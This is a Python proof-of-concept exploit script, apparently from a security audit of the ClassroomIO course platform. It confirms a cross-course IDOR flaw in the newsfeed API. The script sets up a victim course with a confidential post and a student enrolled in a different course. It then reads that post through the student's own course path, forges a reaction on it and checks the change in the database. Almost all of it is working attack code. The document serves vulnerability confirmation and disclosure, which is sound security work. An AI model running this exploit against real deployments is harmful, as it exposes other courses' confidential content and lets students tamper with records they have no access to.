#!/usr/bin/env python3
"""
VULN-027 (AC-1) — Course newsfeed item IDOR: read/react (student) and edit/delete (tutor)
keyed on :feedId with no course scope → cross-course / cross-tenant.

Vulnerable code (targets/classroomio/):
  * routes:  apps/api/src/routes/course/newsfeed.ts:48-123 (get/react = courseMemberMiddleware; put/delete = team)
  * service: apps/api/src/services/newsfeed/newsfeed.ts:74,140,171,201 (all key on feedId only)
  * query:   packages/db/src/queries/newsfeed (getNewsfeedById / updateNewsfeed / deleteNewsfeed by id)

Class: CWE-639 IDOR / broken object-level authorization (missing course scope on the child id).

The flaw: every course-newsfeed operation is authorized against the URL `:courseId` but then acts on
a `:feedId` that is never reconciled with that course. `getNewsfeedItem(feedId)` /
`updateNewsfeedReactionService(feedId, …)` load/modify by id alone. A member of course Y can pass a
feedId that belongs to course X and read it / react to it; a tutor of Y can edit or delete X's items.

Exploitation idea: admin posts a newsfeed item in course X (feedX). A student enrolled only in a
different course Y reads feedX via /course/Y/newsfeed/feedX and forges a reaction on it.

A successful run proves: a plain STUDENT of course Y reads a newsfeed item belonging to course X
(cross-course confidentiality) and mutates its reaction state — the item is not scoped to the path
course, verified in the DB.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (log, banner, verdict, admin_login, make_student,  # noqa: E402
                     create_course, ORG_ID, rid, psql)

VULN = "VULN-027"
HERE = os.path.dirname(os.path.abspath(__file__))


def free_seats(profile_ids):
    """Archive org-membership for the test students THIS run created (keeps the Free-plan
    20-student seat count bounded). Only touches ids created here."""
    ids = ",".join(f"'{p}'" for p in profile_ids if p)
    if not ids:
        return
    psql(f"update organizationmember set status='ARCHIVED', status_changed_at=now() "
         f"where organization_id='{ORG_ID}' and role_id=3 and profile_id in ({ids});")
    log("INFO", f"cleanup: archived {len([p for p in profile_ids if p])} test-student seat(s) created this run")


def main():
    banner(VULN, "Course newsfeed IDOR (cross-course read + reaction forge)")
    log("INFO", "routes newsfeed.ts:48-123 authorize on URL :courseId; services key on :feedId with no scope")

    admin = admin_login()

    # --- Course X with a newsfeed item authored by the admin (the victim course) ---
    course_x = create_course(admin, title=f"X {rid('c')}")
    cx = course_x["id"]
    secret_marker = rid("secret")
    content = f"CONFIDENTIAL course-X announcement {secret_marker}"
    rn = admin.post(f"/course/{cx}/newsfeed", org=True, json={"courseId": cx, "content": content})
    if rn.status_code != 201:
        verdict(VULN, "FAILED", f"could not create newsfeed in X: {rn.status_code} {rn.text[:200]}")
        sys.exit(1)
    feed_x = rn.json().get("data", {}).get("id")
    log("SETUP", f"course X={cx} newsfeed item feedX={feed_x} (content carries marker {secret_marker})")

    # --- A student enrolled only in a DIFFERENT course Y ---
    student, info = make_student(admin, label="studentY")   # fresh course Y
    cy = info["course_id"]
    log("SETUP", f"student={info['user_id']} enrolled in Y={cy} only (role {info['role_in_org']}), NOT in X")

    y_in_x = psql(
        "select count(*) from groupmember gm join \"group\" g on gm.group_id=g.id "
        f"join course c on c.group_id=g.id where c.id='{cx}' and gm.profile_id='{info['user_id']}';")
    log("INFO", f"DB: student membership rows in course X = {y_in_x} (expect 0)")

    # --- Cross-course READ: fetch course X's feed item via course Y's path ---
    log("STEP", f"student: GET /course/{cy}/newsfeed/{feed_x}  (path course Y, feed from X)")
    rg = student.get(f"/course/{cy}/newsfeed/{feed_x}", org=True)
    got = rg.json().get("data", {}) if rg.status_code == 200 else {}
    log("INFO", f"  response: HTTP {rg.status_code} content={got.get('content')!r} courseId={got.get('courseId')}")
    read_ok = (rg.status_code == 200) and (secret_marker in (got.get("content") or "")) and (got.get("courseId") == cx)
    if read_ok:
        log("PROOF", f"student read course X's newsfeed content ({secret_marker}) through course Y's path — "
                     f"returned item.courseId={got.get('courseId')} != path course {cy}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"GET /course/{cy}/newsfeed/{feed_x} HTTP/1.1\n")
        f.write("Host: localhost:21527\n")
        f.write(f"cio-org-id: {ORG_ID}\n")
        f.write("Cookie: classroomio.session_token=<STUDENT session — member of course Y only>\n\n")
        f.write(f"# feed {feed_x} belongs to course X ({cx}); caller is enrolled only in Y ({cy}).\n")

    # --- Cross-course REACT: forge a reaction on X's feed via Y's path ---
    forged = {"reaction": {"clap": [info["user_id"], "forged-" + rid("r")], "smile": [], "thumbsup": [], "thumbsdown": []}}
    log("STEP", f"student: PUT /course/{cy}/newsfeed/{feed_x}/react (forge reaction on X's item)")
    rr = student.put(f"/course/{cy}/newsfeed/{feed_x}/react", org=True, json=forged)
    db_reaction = psql(f"select reaction::text from course_newsfeed where id='{feed_x}';")
    log("INFO", f"  react: HTTP {rr.status_code}")
    log("PROOF", f"DB course_newsfeed[{feed_x}].reaction after student's write = {db_reaction!r}")
    react_ok = (rr.status_code == 200) and (db_reaction is not None) and ("forged-" in (db_reaction or ""))

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"GET /course/{cy}/newsfeed/{feed_x} -> HTTP {rg.status_code}\n{rg.text}\n\n")
        f.write(f"PUT /course/{cy}/newsfeed/{feed_x}/react -> HTTP {rr.status_code}\n{rr.text}\n\n")
        f.write(f"DB reaction: {db_reaction!r}\n")

    free_seats([info["user_id"]])

    if (y_in_x == "0") and read_ok and react_ok:
        log("PROOF", "cross-course read AND reaction write on an item outside the caller's course — DB-confirmed")
        verdict(VULN, "CONFIRMED", "student reads + reacts to another course's newsfeed item (no course scope on feedId)")
        log("OK", "exploit confirmed — course newsfeed IDOR (read + react cross-course)")
        sys.exit(0)

    verdict(VULN, "FAILED", f"y_in_x={y_in_x} read_ok={read_ok} react_ok={react_ok}")
    log("FAIL", "cross-course read/react did not both take effect")
    sys.exit(1)


if __name__ == "__main__":
    main()
